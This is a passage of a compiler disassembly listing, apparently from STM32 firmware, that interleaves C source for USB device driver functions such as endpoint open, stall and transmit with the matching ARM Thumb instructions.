  hal_status = HAL_PCD_Start(pdev->pData);
 800cd50:	687b      	ldr	r3, [r7, #4]
 800cd52:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cd56:	4618      	mov	r0, r3
 800cd58:	f7f5 f9b0 	bl	80020bc <HAL_PCD_Start>
 800cd5c:	4603      	mov	r3, r0
 800cd5e:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cd60:	7bbb      	ldrb	r3, [r7, #14]
 800cd62:	2b03      	cmp	r3, #3
 800cd64:	d816      	bhi.n	800cd94 <USBD_LL_Start+0x54>
 800cd66:	a201      	add	r2, pc, #4	; (adr r2, 800cd6c <USBD_LL_Start+0x2c>)
 800cd68:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cd6c:	0800cd7d 	.word	0x0800cd7d
 800cd70:	0800cd83 	.word	0x0800cd83
 800cd74:	0800cd89 	.word	0x0800cd89
 800cd78:	0800cd8f 	.word	0x0800cd8f
    case HAL_OK :
      usb_status = USBD_OK;
 800cd7c:	2300      	movs	r3, #0
 800cd7e:	73fb      	strb	r3, [r7, #15]
    break;
 800cd80:	e00b      	b.n	800cd9a <USBD_LL_Start+0x5a>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cd82:	2303      	movs	r3, #3
 800cd84:	73fb      	strb	r3, [r7, #15]
    break;
 800cd86:	e008      	b.n	800cd9a <USBD_LL_Start+0x5a>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cd88:	2301      	movs	r3, #1
 800cd8a:	73fb      	strb	r3, [r7, #15]
    break;
 800cd8c:	e005      	b.n	800cd9a <USBD_LL_Start+0x5a>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cd8e:	2303      	movs	r3, #3
 800cd90:	73fb      	strb	r3, [r7, #15]
    break;
 800cd92:	e002      	b.n	800cd9a <USBD_LL_Start+0x5a>
    default :
      usb_status = USBD_FAIL;
 800cd94:	2303      	movs	r3, #3
 800cd96:	73fb      	strb	r3, [r7, #15]
    break;
 800cd98:	bf00      	nop
  }
  return usb_status;
 800cd9a:	7bfb      	ldrb	r3, [r7, #15]
}
 800cd9c:	4618      	mov	r0, r3
 800cd9e:	3710      	adds	r7, #16
 800cda0:	46bd      	mov	sp, r7
 800cda2:	bd80      	pop	{r7, pc}

0800cda4 <USBD_LL_OpenEP>:
  * @param  ep_type: Endpoint type
  * @param  ep_mps: Endpoint max packet size
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_OpenEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr, uint8_t ep_type, uint16_t ep_mps)
{
 800cda4:	b580      	push	{r7, lr}
 800cda6:	b084      	sub	sp, #16
 800cda8:	af00      	add	r7, sp, #0
 800cdaa:	6078      	str	r0, [r7, #4]
 800cdac:	4608      	mov	r0, r1
 800cdae:	4611      	mov	r1, r2
 800cdb0:	461a      	mov	r2, r3
 800cdb2:	4603      	mov	r3, r0
 800cdb4:	70fb      	strb	r3, [r7, #3]
 800cdb6:	460b      	mov	r3, r1
 800cdb8:	70bb      	strb	r3, [r7, #2]
 800cdba:	4613      	mov	r3, r2
 800cdbc:	803b      	strh	r3, [r7, #0]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cdbe:	2300      	movs	r3, #0
 800cdc0:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cdc2:	2300      	movs	r3, #0
 800cdc4:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_Open(pdev->pData, ep_addr, ep_mps, ep_type);
 800cdc6:	687b      	ldr	r3, [r7, #4]
 800cdc8:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800cdcc:	78bb      	ldrb	r3, [r7, #2]
 800cdce:	883a      	ldrh	r2, [r7, #0]
 800cdd0:	78f9      	ldrb	r1, [r7, #3]
 800cdd2:	f7f5 fae1 	bl	8002398 <HAL_PCD_EP_Open>
 800cdd6:	4603      	mov	r3, r0
 800cdd8:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cdda:	7bbb      	ldrb	r3, [r7, #14]
 800cddc:	2b03      	cmp	r3, #3
 800cdde:	d817      	bhi.n	800ce10 <USBD_LL_OpenEP+0x6c>
 800cde0:	a201      	add	r2, pc, #4	; (adr r2, 800cde8 <USBD_LL_OpenEP+0x44>)
 800cde2:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cde6:	bf00      	nop
 800cde8:	0800cdf9 	.word	0x0800cdf9
 800cdec:	0800cdff 	.word	0x0800cdff
 800cdf0:	0800ce05 	.word	0x0800ce05
 800cdf4:	0800ce0b 	.word	0x0800ce0b
    case HAL_OK :
      usb_status = USBD_OK;
 800cdf8:	2300      	movs	r3, #0
 800cdfa:	73fb      	strb	r3, [r7, #15]
    break;
 800cdfc:	e00b      	b.n	800ce16 <USBD_LL_OpenEP+0x72>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cdfe:	2303      	movs	r3, #3
 800ce00:	73fb      	strb	r3, [r7, #15]
    break;
 800ce02:	e008      	b.n	800ce16 <USBD_LL_OpenEP+0x72>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800ce04:	2301      	movs	r3, #1
 800ce06:	73fb      	strb	r3, [r7, #15]
    break;
 800ce08:	e005      	b.n	800ce16 <USBD_LL_OpenEP+0x72>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800ce0a:	2303      	movs	r3, #3
 800ce0c:	73fb      	strb	r3, [r7, #15]
    break;
 800ce0e:	e002      	b.n	800ce16 <USBD_LL_OpenEP+0x72>
    default :
      usb_status = USBD_FAIL;
 800ce10:	2303      	movs	r3, #3
 800ce12:	73fb      	strb	r3, [r7, #15]
    break;
 800ce14:	bf00      	nop
  }
  return usb_status;
 800ce16:	7bfb      	ldrb	r3, [r7, #15]
}
 800ce18:	4618      	mov	r0, r3
 800ce1a:	3710      	adds	r7, #16
 800ce1c:	46bd      	mov	sp, r7
 800ce1e:	bd80      	pop	{r7, pc}

0800ce20 <USBD_LL_CloseEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_CloseEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800ce20:	b580      	push	{r7, lr}
 800ce22:	b084      	sub	sp, #16
 800ce24:	af00      	add	r7, sp, #0
 800ce26:	6078      	str	r0, [r7, #4]
 800ce28:	460b      	mov	r3, r1
 800ce2a:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800ce2c:	2300      	movs	r3, #0
 800ce2e:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800ce30:	2300      	movs	r3, #0
 800ce32:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_Close(pdev->pData, ep_addr);
 800ce34:	687b      	ldr	r3, [r7, #4]
 800ce36:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800ce3a:	78fa      	ldrb	r2, [r7, #3]
 800ce3c:	4611      	mov	r1, r2
 800ce3e:	4618      	mov	r0, r3
 800ce40:	f7f5 fb07 	bl	8002452 <HAL_PCD_EP_Close>
 800ce44:	4603      	mov	r3, r0
 800ce46:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800ce48:	7bbb      	ldrb	r3, [r7, #14]
 800ce4a:	2b03      	cmp	r3, #3
 800ce4c:	d816      	bhi.n	800ce7c <USBD_LL_CloseEP+0x5c>
 800ce4e:	a201      	add	r2, pc, #4	; (adr r2, 800ce54 <USBD_LL_CloseEP+0x34>)
 800ce50:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800ce54:	0800ce65 	.word	0x0800ce65
 800ce58:	0800ce6b 	.word	0x0800ce6b
 800ce5c:	0800ce71 	.word	0x0800ce71
 800ce60:	0800ce77 	.word	0x0800ce77
    case HAL_OK :
      usb_status = USBD_OK;
 800ce64:	2300      	movs	r3, #0
 800ce66:	73fb      	strb	r3, [r7, #15]
    break;
 800ce68:	e00b      	b.n	800ce82 <USBD_LL_CloseEP+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800ce6a:	2303      	movs	r3, #3
 800ce6c:	73fb      	strb	r3, [r7, #15]
    break;
 800ce6e:	e008      	b.n	800ce82 <USBD_LL_CloseEP+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800ce70:	2301      	movs	r3, #1
 800ce72:	73fb      	strb	r3, [r7, #15]
    break;
 800ce74:	e005      	b.n	800ce82 <USBD_LL_CloseEP+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800ce76:	2303      	movs	r3, #3
 800ce78:	73fb      	strb	r3, [r7, #15]
    break;
 800ce7a:	e002      	b.n	800ce82 <USBD_LL_CloseEP+0x62>
    default :
      usb_status = USBD_FAIL;
 800ce7c:	2303      	movs	r3, #3
 800ce7e:	73fb      	strb	r3, [r7, #15]
    break;
 800ce80:	bf00      	nop
  }
  return usb_status;
 800ce82:	7bfb      	ldrb	r3, [r7, #15]
}
 800ce84:	4618      	mov	r0, r3
 800ce86:	3710      	adds	r7, #16
 800ce88:	46bd      	mov	sp, r7
 800ce8a:	bd80      	pop	{r7, pc}

0800ce8c <USBD_LL_FlushEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_FlushEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800ce8c:	b580      	push	{r7, lr}
 800ce8e:	b084      	sub	sp, #16
 800ce90:	af00      	add	r7, sp, #0
 800ce92:	6078      	str	r0, [r7, #4]
 800ce94:	460b      	mov	r3, r1
 800ce96:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800ce98:	2300      	movs	r3, #0
 800ce9a:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800ce9c:	2300      	movs	r3, #0
 800ce9e:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_Flush(pdev->pData, ep_addr);
 800cea0:	687b      	ldr	r3, [r7, #4]
 800cea2:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cea6:	78fa      	ldrb	r2, [r7, #3]
 800cea8:	4611      	mov	r1, r2
 800ceaa:	4618      	mov	r0, r3
 800ceac:	f7f5 fc66 	bl	800277c <HAL_PCD_EP_Flush>
 800ceb0:	4603      	mov	r3, r0
 800ceb2:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800ceb4:	7bbb      	ldrb	r3, [r7, #14]
 800ceb6:	2b03      	cmp	r3, #3
 800ceb8:	d816      	bhi.n	800cee8 <USBD_LL_FlushEP+0x5c>
 800ceba:	a201      	add	r2, pc, #4	; (adr r2, 800cec0 <USBD_LL_FlushEP+0x34>)
 800cebc:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cec0:	0800ced1 	.word	0x0800ced1
 800cec4:	0800ced7 	.word	0x0800ced7
 800cec8:	0800cedd 	.word	0x0800cedd
 800cecc:	0800cee3 	.word	0x0800cee3
    case HAL_OK :
      usb_status = USBD_OK;
 800ced0:	2300      	movs	r3, #0
 800ced2:	73fb      	strb	r3, [r7, #15]
    break;
 800ced4:	e00b      	b.n	800ceee <USBD_LL_FlushEP+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800ced6:	2303      	movs	r3, #3
 800ced8:	73fb      	strb	r3, [r7, #15]
    break;
 800ceda:	e008      	b.n	800ceee <USBD_LL_FlushEP+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cedc:	2301      	movs	r3, #1
 800cede:	73fb      	strb	r3, [r7, #15]
    break;
 800cee0:	e005      	b.n	800ceee <USBD_LL_FlushEP+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cee2:	2303      	movs	r3, #3
 800cee4:	73fb      	strb	r3, [r7, #15]
    break;
 800cee6:	e002      	b.n	800ceee <USBD_LL_FlushEP+0x62>
    default :
      usb_status = USBD_FAIL;
 800cee8:	2303      	movs	r3, #3
 800ceea:	73fb      	strb	r3, [r7, #15]
    break;
 800ceec:	bf00      	nop
  }
  return usb_status;
 800ceee:	7bfb      	ldrb	r3, [r7, #15]
}
 800cef0:	4618      	mov	r0, r3
 800cef2:	3710      	adds	r7, #16
 800cef4:	46bd      	mov	sp, r7
 800cef6:	bd80      	pop	{r7, pc}

0800cef8 <USBD_LL_StallEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_StallEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800cef8:	b580      	push	{r7, lr}
 800cefa:	b084      	sub	sp, #16
 800cefc:	af00      	add	r7, sp, #0
 800cefe:	6078      	str	r0, [r7, #4]
 800cf00:	460b      	mov	r3, r1
 800cf02:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cf04:	2300      	movs	r3, #0
 800cf06:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cf08:	2300      	movs	r3, #0
 800cf0a:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_SetStall(pdev->pData, ep_addr);
 800cf0c:	687b      	ldr	r3, [r7, #4]
 800cf0e:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cf12:	78fa      	ldrb	r2, [r7, #3]
 800cf14:	4611      	mov	r1, r2
 800cf16:	4618      	mov	r0, r3
 800cf18:	f7f5 fb7c 	bl	8002614 <HAL_PCD_EP_SetStall>
 800cf1c:	4603      	mov	r3, r0
 800cf1e:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cf20:	7bbb      	ldrb	r3, [r7, #14]
 800cf22:	2b03      	cmp	r3, #3
 800cf24:	d816      	bhi.n	800cf54 <USBD_LL_StallEP+0x5c>
 800cf26:	a201      	add	r2, pc, #4	; (adr r2, 800cf2c <USBD_LL_StallEP+0x34>)
 800cf28:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cf2c:	0800cf3d 	.word	0x0800cf3d
 800cf30:	0800cf43 	.word	0x0800cf43
 800cf34:	0800cf49 	.word	0x0800cf49
 800cf38:	0800cf4f 	.word	0x0800cf4f
    case HAL_OK :
      usb_status = USBD_OK;
 800cf3c:	2300      	movs	r3, #0
 800cf3e:	73fb      	strb	r3, [r7, #15]
    break;
 800cf40:	e00b      	b.n	800cf5a <USBD_LL_StallEP+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cf42:	2303      	movs	r3, #3
 800cf44:	73fb      	strb	r3, [r7, #15]
    break;
 800cf46:	e008      	b.n	800cf5a <USBD_LL_StallEP+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cf48:	2301      	movs	r3, #1
 800cf4a:	73fb      	strb	r3, [r7, #15]
    break;
 800cf4c:	e005      	b.n	800cf5a <USBD_LL_StallEP+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cf4e:	2303      	movs	r3, #3
 800cf50:	73fb      	strb	r3, [r7, #15]
    break;
 800cf52:	e002      	b.n	800cf5a <USBD_LL_StallEP+0x62>
    default :
      usb_status = USBD_FAIL;
 800cf54:	2303      	movs	r3, #3
 800cf56:	73fb      	strb	r3, [r7, #15]
    break;
 800cf58:	bf00      	nop
  }
  return usb_status;
 800cf5a:	7bfb      	ldrb	r3, [r7, #15]
}
 800cf5c:	4618      	mov	r0, r3
 800cf5e:	3710      	adds	r7, #16
 800cf60:	46bd      	mov	sp, r7
 800cf62:	bd80      	pop	{r7, pc}

0800cf64 <USBD_LL_ClearStallEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_ClearStallEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800cf64:	b580      	push	{r7, lr}
 800cf66:	b084      	sub	sp, #16
 800cf68:	af00      	add	r7, sp, #0
 800cf6a:	6078      	str	r0, [r7, #4]
 800cf6c:	460b      	mov	r3, r1
 800cf6e:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cf70:	2300      	movs	r3, #0
 800cf72:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cf74:	2300      	movs	r3, #0
 800cf76:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_ClrStall(pdev->pData, ep_addr);
 800cf78:	687b      	ldr	r3, [r7, #4]
 800cf7a:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cf7e:	78fa      	ldrb	r2, [r7, #3]
 800cf80:	4611      	mov	r1, r2
 800cf82:	4618      	mov	r0, r3
 800cf84:	f7f5 fba6 	bl	80026d4 <HAL_PCD_EP_ClrStall>
 800cf88:	4603      	mov	r3, r0
 800cf8a:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cf8c:	7bbb      	ldrb	r3, [r7, #14]
 800cf8e:	2b03      	cmp	r3, #3
 800cf90:	d816      	bhi.n	800cfc0 <USBD_LL_ClearStallEP+0x5c>
 800cf92:	a201      	add	r2, pc, #4	; (adr r2, 800cf98 <USBD_LL_ClearStallEP+0x34>)
 800cf94:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cf98:	0800cfa9 	.word	0x0800cfa9
 800cf9c:	0800cfaf 	.word	0x0800cfaf
 800cfa0:	0800cfb5 	.word	0x0800cfb5
 800cfa4:	0800cfbb 	.word	0x0800cfbb
    case HAL_OK :
      usb_status = USBD_OK;
 800cfa8:	2300      	movs	r3, #0
 800cfaa:	73fb      	strb	r3, [r7, #15]
    break;
 800cfac:	e00b      	b.n	800cfc6 <USBD_LL_ClearStallEP+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cfae:	2303      	movs	r3, #3
 800cfb0:	73fb      	strb	r3, [r7, #15]
    break;
 800cfb2:	e008      	b.n	800cfc6 <USBD_LL_ClearStallEP+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cfb4:	2301      	movs	r3, #1
 800cfb6:	73fb      	strb	r3, [r7, #15]
    break;
 800cfb8:	e005      	b.n	800cfc6 <USBD_LL_ClearStallEP+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cfba:	2303      	movs	r3, #3
 800cfbc:	73fb      	strb	r3, [r7, #15]
    break;
 800cfbe:	e002      	b.n	800cfc6 <USBD_LL_ClearStallEP+0x62>
    default :
      usb_status = USBD_FAIL;
 800cfc0:	2303      	movs	r3, #3
 800cfc2:	73fb      	strb	r3, [r7, #15]
    break;
 800cfc4:	bf00      	nop
  }
  return usb_status;
 800cfc6:	7bfb      	ldrb	r3, [r7, #15]
}
 800cfc8:	4618      	mov	r0, r3
 800cfca:	3710      	adds	r7, #16
 800cfcc:	46bd      	mov	sp, r7
 800cfce:	bd80      	pop	{r7, pc}

0800cfd0 <USBD_LL_IsStallEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval Stall (1: Yes, 0: No)
  */
uint8_t USBD_LL_IsStallEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800cfd0:	b480      	push	{r7}
 800cfd2:	b085      	sub	sp, #20
 800cfd4:	af00      	add	r7, sp, #0
 800cfd6:	6078      	str	r0, [r7, #4]
 800cfd8:	460b      	mov	r3, r1
 800cfda:	70fb      	strb	r3, [r7, #3]
  PCD_HandleTypeDef *hpcd = (PCD_HandleTypeDef*) pdev->pData;
 800cfdc:	687b      	ldr	r3, [r7, #4]
 800cfde:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cfe2:	60fb      	str	r3, [r7, #12]

  if((ep_addr & 0x80) == 0x80)
 800cfe4:	f997 3003 	ldrsb.w	r3, [r7, #3]
 800cfe8:	2b00      	cmp	r3, #0
 800cfea:	da0c      	bge.n	800d006 <USBD_LL_IsStallEP+0x36>
  {
    return hpcd->IN_ep[ep_addr & 0x7F].is_stall;
 800cfec:	78fb      	ldrb	r3, [r7, #3]
 800cfee:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 800cff2:	68f9      	ldr	r1, [r7, #12]
 800cff4:	1c5a      	adds	r2, r3, #1
 800cff6:	4613      	mov	r3, r2
 800cff8:	009b      	lsls	r3, r3, #2
 800cffa:	4413      	add	r3, r2
 800cffc:	00db      	lsls	r3, r3, #3
 800cffe:	440b      	add	r3, r1
 800d000:	3302      	adds	r3, #2
 800d002:	781b      	ldrb	r3, [r3, #0]
 800d004:	e00b      	b.n	800d01e <USBD_LL_IsStallEP+0x4e>
  }
  else
  {
    return hpcd->OUT_ep[ep_addr & 0x7F].is_stall;
 800d006:	78fb      	ldrb	r3, [r7, #3]
 800d008:	f003 027f 	and.w	r2, r3, #127	; 0x7f
 800d00c:	68f9      	ldr	r1, [r7, #12]
 800d00e:	4613      	mov	r3, r2
 800d010:	009b      	lsls	r3, r3, #2
 800d012:	4413      	add	r3, r2
 800d014:	00db      	lsls	r3, r3, #3
 800d016:	440b      	add	r3, r1
 800d018:	f503 73b5 	add.w	r3, r3, #362	; 0x16a
 800d01c:	781b      	ldrb	r3, [r3, #0]
  }
}
 800d01e:	4618      	mov	r0, r3
 800d020:	3714      	adds	r7, #20
 800d022:	46bd      	mov	sp, r7
 800d024:	f85d 7b04 	ldr.w	r7, [sp], #4
 800d028:	4770      	bx	lr
	...

0800d02c <USBD_LL_SetUSBAddress>:
  * @param  pdev: Device handle
  * @param  dev_addr: Device address
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_SetUSBAddress(USBD_HandleTypeDef *pdev, uint8_t dev_addr)
{
 800d02c:	b580      	push	{r7, lr}
 800d02e:	b084      	sub	sp, #16
 800d030:	af00      	add	r7, sp, #0
 800d032:	6078      	str	r0, [r7, #4]
 800d034:	460b      	mov	r3, r1
 800d036:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800d038:	2300      	movs	r3, #0
 800d03a:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800d03c:	2300      	movs	r3, #0
 800d03e:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_SetAddress(pdev->pData, dev_addr);
 800d040:	687b      	ldr	r3, [r7, #4]
 800d042:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800d046:	78fa      	ldrb	r2, [r7, #3]
 800d048:	4611      	mov	r1, r2
 800d04a:	4618      	mov	r0, r3
 800d04c:	f7f5 f97f 	bl	800234e <HAL_PCD_SetAddress>
 800d050:	4603      	mov	r3, r0
 800d052:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800d054:	7bbb      	ldrb	r3, [r7, #14]
 800d056:	2b03      	cmp	r3, #3
 800d058:	d816      	bhi.n	800d088 <USBD_LL_SetUSBAddress+0x5c>
 800d05a:	a201      	add	r2, pc, #4	; (adr r2, 800d060 <USBD_LL_SetUSBAddress+0x34>)
 800d05c:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800d060:	0800d071 	.word	0x0800d071
 800d064:	0800d077 	.word	0x0800d077
 800d068:	0800d07d 	.word	0x0800d07d
 800d06c:	0800d083 	.word	0x0800d083
    case HAL_OK :
      usb_status = USBD_OK;
 800d070:	2300      	movs	r3, #0
 800d072:	73fb      	strb	r3, [r7, #15]
    break;
 800d074:	e00b      	b.n	800d08e <USBD_LL_SetUSBAddress+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800d076:	2303      	movs	r3, #3
 800d078:	73fb      	strb	r3, [r7, #15]
    break;
 800d07a:	e008      	b.n	800d08e <USBD_LL_SetUSBAddress+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800d07c:	2301      	movs	r3, #1
 800d07e:	73fb      	strb	r3, [r7, #15]
    break;
 800d080:	e005      	b.n	800d08e <USBD_LL_SetUSBAddress+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800d082:	2303      	movs	r3, #3
 800d084:	73fb      	strb	r3, [r7, #15]
    break;
 800d086:	e002      	b.n	800d08e <USBD_LL_SetUSBAddress+0x62>
    default :
      usb_status = USBD_FAIL;
 800d088:	2303      	movs	r3, #3
 800d08a:	73fb      	strb	r3, [r7, #15]
    break;
 800d08c:	bf00      	nop
  }
  return usb_status;
 800d08e:	7bfb      	ldrb	r3, [r7, #15]
}
 800d090:	4618      	mov	r0, r3
 800d092:	3710      	adds	r7, #16
 800d094:	46bd      	mov	sp, r7
 800d096:	bd80      	pop	{r7, pc}

0800d098 <USBD_LL_Transmit>:
  * @param  pbuf: Pointer to data to be sent
  * @param  size: Data size
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_Transmit(USBD_HandleTypeDef *pdev, uint8_t ep_addr, uint8_t *pbuf, uint32_t size)
{
 800d098:	b580      	push	{r7, lr}
 800d09a:	b086      	sub	sp, #24
 800d09c:	af00      	add	r7, sp, #0
 800d09e:	60f8      	str	r0, [r7, #12]
 800d0a0:	607a      	str	r2, [r7, #4]
 800d0a2:	603b      	str	r3, [r7, #0]
 800d0a4:	460b      	mov	r3, r1
 800d0a6:	72fb      	strb	r3, [r7, #11]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800d0a8:	2300      	movs	r3, #0
 800d0aa:	75bb      	strb	r3, [r7, #22]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800d0ac:	2300      	movs	r3, #0
 800d0ae:	75fb      	strb	r3, [r7, #23]

  hal_status = HAL_PCD_EP_Transmit(pdev->pData, ep_addr, pbuf, size);
 800d0b0:	68fb      	ldr	r3, [r7, #12]
 800d0b2:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800d0b6:	7af9      	ldrb	r1, [r7, #11]
 800d0b8:	683b      	ldr	r3, [r7, #0]
 800d0ba:	687a      	ldr	r2, [r7, #4]
 800d0bc:	f7f5 fa5a 	bl	8002574 <HAL_PCD_EP_Transmit>
 800d0c0:	4603      	mov	r3, r0
 800d0c2:	75bb      	strb	r3, [r7, #22]

  switch (hal_status) {
 800d0c4:	7dbb      	ldrb	r3, [r7, #22]
 800d0c6:	2b03      	cmp	r3, #3
 800d0c8:	d816      	bhi.n	800d0f8 <USBD_LL_Transmit+0x60>
 800d0ca:	a201      	add	r2, pc, #4	; (adr r2, 800d0d0 <USBD_LL_Transmit+0x38>)
 800d0cc:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800d0d0:	0800d0e1 	.word	0x0800d0e1
 800d0d4:	0800d0e7 	.word	0x0800d0e7
 800d0d8:	0800d0ed 	.word	0x0800d0ed
 800d0dc:	0800d0f3 	.word	0x0800d0f3
    case HAL_OK :
      usb_status = USBD_OK;
 800d0e0:	2300      	movs	r3, #0
 800d0e2:	75fb      	strb	r3, [r7, #23]
    break;
 800d0e4:	e00b      	b.n	800d0fe <USBD_LL_Transmit+0x66>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800d0e6:	2303      	movs	r3, #3
 800d0e8:	75fb      	strb	r3, [r7, #23]
    break;
 800d0ea:	e008      	b.n	800d0fe <USBD_LL_Transmit+0x66>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800d0ec:	2301      	movs	r3, #1
 800d0ee:	75fb      	strb	r3, [r7, #23]
    break;
 800d0f0:	e005      	b.n	800d0fe <USBD_LL_Transmit+0x66>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800d0f2:	2303      	movs	r3, #3
 800d0f4:	75fb      	strb	r3, [r7, #23]
    break;
 800d0f6:	e002      	b.n	800d0fe <USBD_LL_Transmit+0x66>
    default :
      usb_status = USBD_FAIL;
 800d0f8:	2303      	movs	r3, #3
 800d0fa:	75fb      	strb	r3, [r7, #23]
    break;
 800d0fc:	bf00      	nop
  }
  return usb_status;
 800d0fe:	7dfb      	ldrb	r3, [r7, #23]
}
 800d100:	4618      	mov	r0, r3
 800d102:	3718      	adds	r7, #24
 800d104:	46bd      	mov	sp, r7
 800d106:	bd80      	pop	{r7, pc}

0800d108 <USBD_LL_PrepareReceive>:
  * @param  pbuf: Pointer to data to be received
  * @param  size: Data size
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_PrepareReceive(USBD_HandleTypeDef *pdev, uint8_t ep_addr, uint8_t *pbuf, uint32_t size)
{
 800d108:	b580      	push	{r7, lr}
 800d10a:	b086      	sub	sp, #24
 800d10c:	af00      	add	r7, sp, #0
 800d10e:	60f8      	str	r0, [r7, #12]
 800d110:	607a      	str	r2, [r7, #4]
 800d112:	603b      	str	r3, [r7, #0]
 800d114:	460b      	mov	r3, r1
 800d116:	72fb      	strb	r3, [r7, #11]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800d118:	2300      	movs	r3, #0
 800d11a:	75bb      	strb	r3, [r7, #22]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800d11c:	2300      	movs	r3, #0
 800d11e:	75fb      	strb	r3, [r7, #23]

  hal_status = HAL_PCD_EP_Receive(pdev->pData, ep_addr, pbuf, size);
 800d120:	68fb      	ldr	r3, [r7, #12]
 800d122:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800d126:	7af9      	ldrb	r1, [r7, #11]
 800d128:	683b      	ldr	r3, [r7, #0]
 800d12a:	687a      	ldr	r2, [r7, #4]
